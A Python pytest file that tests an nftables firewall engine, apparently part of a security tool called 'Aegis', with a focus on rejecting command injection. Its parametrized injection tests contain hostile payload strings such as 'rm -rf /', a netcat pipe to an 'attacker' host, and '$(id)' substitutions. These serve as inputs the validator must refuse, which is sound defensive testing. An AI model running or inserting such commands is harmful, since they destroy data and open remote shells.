"""Tests for the secure Linux (nftables) firewall engine.

Mirrors the Windows firewall suite: a dependency-injected *recording runner*
exercises the whole engine without root or a real ``nft``, capturing the exact
argument list so the security properties can be proven —

* malicious input is rejected before any command is built or run,
* commands are passed as an argument **list**, never a shell string,
* containment refuses to block 'any'.
"""
import json

import pytest

from aegis import RULE_TAG
from aegis.core.models import (
    FirewallAction,
    FirewallDirection,
    FirewallRule,
    Protocol,
)
from aegis.core.validators import ValidationError
from aegis.response.command import RunResult
from aegis.response.linux import NftablesManager, _is_ipv6, _port_expr


class RecordingRunner:
    """Fake CommandRunner: records argv lists, returns canned results."""

    def __init__(self, result: RunResult | None = None, results: list[RunResult] | None = None):
        self.calls: list[list[str]] = []
        self._result = result if result is not None else RunResult(0, b"")
        self._results = results

    def __call__(self, args, timeout):
        assert isinstance(args, list), "commands must be argument lists, not strings"
        assert all(isinstance(a, str) for a in args)
        self.calls.append(list(args))
        if self._results is not None:
            return self._results[min(len(self.calls) - 1, len(self._results) - 1)]
        return self._result


@pytest.fixture
def mgr(tmp_path):
    """An nftables manager whose state file is isolated to a temp directory."""
    return NftablesManager(runner=RecordingRunner(), state_path=tmp_path / "rules.json")


def _mk(tmp_path, runner=None):
    return NftablesManager(runner=runner or RecordingRunner(),
                           state_path=tmp_path / "rules.json")


# --------------------------------------------------------------------------- #
# Helpers
# --------------------------------------------------------------------------- #
def test_ipv6_detection():
    assert _is_ipv6("2001:db8::1") is True
    assert _is_ipv6("2001:db8::/32") is True
    assert _is_ipv6("192.168.1.1") is False
    assert _is_ipv6("10.0.0.1-10.0.0.9") is False


def test_port_expression_forms():
    assert _port_expr("443") == "443"
    assert _port_expr("8000-8080") == "8000-8080"
    assert _port_expr("80,443") == "{ 80, 443 }"


# --------------------------------------------------------------------------- #
# Argument construction
# --------------------------------------------------------------------------- #
def test_build_args_outbound_block(mgr):
    rule = FirewallRule(name="bad host", direction=FirewallDirection.OUT,
                        action=FirewallAction.BLOCK, protocol=Protocol.TCP,
                        remote_ip="45.9.1.1", remote_port="4444")
    args = mgr._build_add_args(rule)

    assert args[0] == "nft"
    assert args[:6] == ["nft", "add", "rule", "inet", "aegis", "output"]
    # The remote peer is the destination on egress.
    assert "daddr" in args and args[args.index("daddr") + 1] == "45.9.1.1"
    assert args[args.index("dport") + 1] == "4444"
    assert "drop" in args
    assert args[args.index("comment") + 1].startswith(RULE_TAG)


def test_build_args_inbound_uses_saddr(mgr):
    rule = FirewallRule(name="inbound", direction=FirewallDirection.IN,
                        action=FirewallAction.BLOCK, protocol=Protocol.TCP,
                        remote_ip="45.9.1.1", remote_port="4444")
    args = mgr._build_add_args(rule)

    assert args[5] == "input"
    # On ingress the remote peer is the *source*.
    assert args[args.index("saddr") + 1] == "45.9.1.1"
    assert args[args.index("sport") + 1] == "4444"


def test_build_args_ipv6_uses_ip6_keyword(mgr):
    rule = FirewallRule(name="v6", direction=FirewallDirection.OUT,
                        action=FirewallAction.BLOCK, remote_ip="2001:db8::1")
    args = mgr._build_add_args(rule)
    assert "ip6" in args
    assert "ip" not in args


def test_build_args_allow_rule_accepts(mgr):
    rule = FirewallRule(name="allow", direction=FirewallDirection.OUT,
                        action=FirewallAction.ALLOW, remote_ip="10.0.0.5")
    args = mgr._build_add_args(rule)
    assert "accept" in args
    assert "drop" not in args


def test_build_args_tags_rule_name(mgr):
    rule = FirewallRule(name="untagged", direction=FirewallDirection.OUT,
                        action=FirewallAction.BLOCK, remote_ip="1.1.1.1")
    args = mgr._build_add_args(rule)
    assert args[args.index("comment") + 1] == f"{RULE_TAG} untagged"


def test_build_args_does_not_double_tag(mgr):
    rule = FirewallRule(name=f"{RULE_TAG} already", direction=FirewallDirection.OUT,
                        action=FirewallAction.BLOCK, remote_ip="1.1.1.1")
    args = mgr._build_add_args(rule)
    name = args[args.index("comment") + 1]
    assert name == f"{RULE_TAG} already"
    assert name.count(RULE_TAG) == 1


# --------------------------------------------------------------------------- #
# Injection resistance — the core security property
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize("payload", [
    'evil; rm -rf /',
    'evil && reboot',
    'evil | nc attacker 4444',
    'evil`whoami`',
    'evil$(id)',
    'evil\nnft flush ruleset',
    'evil" drop; #',
])
def test_injection_payloads_in_rule_name_are_rejected(mgr, payload):
    rule = FirewallRule(name=payload, direction=FirewallDirection.OUT,
                        action=FirewallAction.BLOCK, remote_ip="1.1.1.1")
    with pytest.raises(ValidationError):
        mgr._build_add_args(rule)


@pytest.mark.parametrize("payload", ["1.1.1.1; reboot", "$(id)", "1.1.1.1 && ls"])
def test_injection_payloads_in_ip_are_rejected(mgr, payload):
    rule = FirewallRule(name="ok", direction=FirewallDirection.OUT,
                        action=FirewallAction.BLOCK, remote_ip=payload)
    with pytest.raises(ValidationError):
        mgr._build_add_args(rule)


def test_create_rule_with_bad_input_runs_no_command(tmp_path):
    runner = RecordingRunner()
    m = _mk(tmp_path, runner)
    result = m.create_rule(FirewallRule(name="evil; reboot", remote_ip="1.1.1.1"))
    assert result.ok is False
    assert "Invalid rule" in result.message
    assert runner.calls == [], "no command may run for an invalid rule"


# --------------------------------------------------------------------------- #
# Table setup safety
# --------------------------------------------------------------------------- #
def test_ensure_table_uses_accept_policy(tmp_path):
    """A filter chain defaulting to drop would cut the host off the network."""
    runner = RecordingRunner()
    m = _mk(tmp_path, runner)
    m.ensure_table()

    chain_calls = [c for c in runner.calls if "chain" in c]
    assert len(chain_calls) == 2, "expects an input and an output chain"
    for call in chain_calls:
        assert "policy" in call
        assert call[call.index("policy") + 1] == "accept"


def test_ensure_table_is_idempotent(tmp_path):
    runner = RecordingRunner()
    m = _mk(tmp_path, runner)
    m.ensure_table()
    first = len(runner.calls)
    m.ensure_table()
    assert len(runner.calls) == first, "table setup must not re-run"


# --------------------------------------------------------------------------- #
# State round-tripping (enable/disable, which nftables cannot do natively)
# --------------------------------------------------------------------------- #
def test_create_rule_persists_state(tmp_path):
    m = _mk(tmp_path)
    result = m.create_rule(FirewallRule(name="keeper", direction=FirewallDirection.OUT,
                                        action=FirewallAction.BLOCK, remote_ip="8.8.8.8"))
    assert result.ok
    saved = json.loads((tmp_path / "rules.json").read_text())
    assert len(saved) == 1
    stored = next(iter(saved.values()))
    assert stored["enabled"] is True
    assert stored["remote_ip"] == "8.8.8.8"


def test_list_rules_returns_created_rule(tmp_path):
    m = _mk(tmp_path)
    m.create_rule(FirewallRule(name="listed", direction=FirewallDirection.OUT,
                               action=FirewallAction.BLOCK, remote_ip="8.8.8.8"))
    rules = m.list_rules()
    assert len(rules) == 1
    assert rules[0].remote_ip == "8.8.8.8"
    assert rules[0].enabled is True


def test_disable_then_enable_round_trip(tmp_path):
    m = _mk(tmp_path)
    created = m.create_rule(FirewallRule(name="toggle", direction=FirewallDirection.OUT,
                                         action=FirewallAction.BLOCK, remote_ip="9.9.9.9"))
    name = created.rule_name

    assert m.set_rule_enabled(name, False).ok
    assert m.list_rules()[0].enabled is False

    assert m.set_rule_enabled(name, True).ok
    rules = m.list_rules()
    assert rules[0].enabled is True
    assert rules[0].remote_ip == "9.9.9.9", "settings must survive the round trip"


def test_set_enabled_on_unknown_rule_fails(mgr):
    result = mgr.set_rule_enabled("Aegis no-such-rule", False)
    assert result.ok is False
    assert "No Aegis rule" in result.message


def test_delete_unknown_rule_fails(mgr):
    assert mgr.delete_rule("Aegis ghost").ok is False


def test_delete_removes_from_state(tmp_path):
    m = _mk(tmp_path)
    created = m.create_rule(FirewallRule(name="doomed", direction=FirewallDirection.OUT,
                                         action=FirewallAction.BLOCK, remote_ip="1.2.3.4"))
    assert m.delete_rule(created.rule_name).ok
    assert m.list_rules() == []


def test_search_rules_matches_field_values(tmp_path):
    m = _mk(tmp_path)
    m.create_rule(FirewallRule(name="findme", direction=FirewallDirection.OUT,
                               action=FirewallAction.BLOCK, remote_ip="203.0.113.7"))
    assert len(m.search_rules("203.0.113")) == 1
    assert m.search_rules("nothing-matches") == []


# --------------------------------------------------------------------------- #
# Containment
# --------------------------------------------------------------------------- #
def test_block_ip_creates_both_directions(tmp_path):
    m = _mk(tmp_path)
    result = m.block_ip("45.9.1.1", note="NET-C2-PORT T1571")
    assert result.ok
    rules = m.list_rules()
    assert len(rules) == 2
    directions = {r.direction for r in rules}
    assert directions == {FirewallDirection.OUT, FirewallDirection.IN}


def test_block_ip_refuses_any(mgr):
    for value in ("any", "0.0.0.0", "*"):
        result = mgr.block_ip(value)
        assert result.ok is False
        assert "Refusing to block" in result.message


def test_block_ip_rejects_invalid_address(mgr):
    result = mgr.block_ip("not-an-ip")
    assert result.ok is False
    assert "Invalid IP" in result.message


# --------------------------------------------------------------------------- #
# Result interpretation
# --------------------------------------------------------------------------- #
def test_permission_denied_flags_needs_admin(tmp_path):
    runner = RecordingRunner(RunResult(1, b"", b"Operation not permitted"))
    m = _mk(tmp_path, runner)
    result = m.create_rule(FirewallRule(name="nope", direction=FirewallDirection.OUT,
                                        action=FirewallAction.BLOCK, remote_ip="1.1.1.1"))
    assert result.ok is False
    assert result.needs_admin is True


def test_failed_create_does_not_persist_state(tmp_path):
    runner = RecordingRunner(RunResult(1, b"", b"some nft error"))
    m = _mk(tmp_path, runner)
    m.create_rule(FirewallRule(name="fails", direction=FirewallDirection.OUT,
                               action=FirewallAction.BLOCK, remote_ip="1.1.1.1"))
    assert m.list_rules() == [], "a rule that did not apply must not be recorded"


# --------------------------------------------------------------------------- #
# Handle lookup / sync
# --------------------------------------------------------------------------- #
def test_handles_parsed_from_nft_json(tmp_path):
    payload = json.dumps({"nftables": [
        {"metainfo": {"version": "1.0.9"}},
        {"rule": {"chain": "output", "handle": 7, "comment": "Aegis block"}},
        {"rule": {"chain": "input", "handle": 9, "comment": "Aegis block"}},
        {"rule": {"chain": "output", "handle": 11, "comment": "something else"}},
    ]}).encode()
    m = _mk(tmp_path, RecordingRunner(RunResult(0, payload)))
    assert sorted(m._handles_for("Aegis block")) == [("input", 9), ("output", 7)]


def test_handles_tolerate_malformed_json(tmp_path):
    m = _mk(tmp_path, RecordingRunner(RunResult(0, b"not json")))
    assert m._handles_for("anything") == []


def test_sync_reapplies_enabled_rules(tmp_path):
    m = _mk(tmp_path)
    m.create_rule(FirewallRule(name="persisted", direction=FirewallDirection.OUT,
                               action=FirewallAction.BLOCK, remote_ip="5.5.5.5"))
    # A fresh manager simulates a reboot: state survives, live ruleset is empty.
    fresh = _mk(tmp_path, RecordingRunner(RunResult(0, b'{"nftables": []}')))
    assert fresh.sync() == 1
